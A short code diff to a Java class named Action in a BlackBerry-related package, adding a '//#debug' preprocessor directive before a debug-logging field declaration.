@@ -22,6 +22,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class Action {
 
     /** The debug instance. */
+	//#debug
     protected static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
 
     /** The Constant ACTION_UNINIT. */
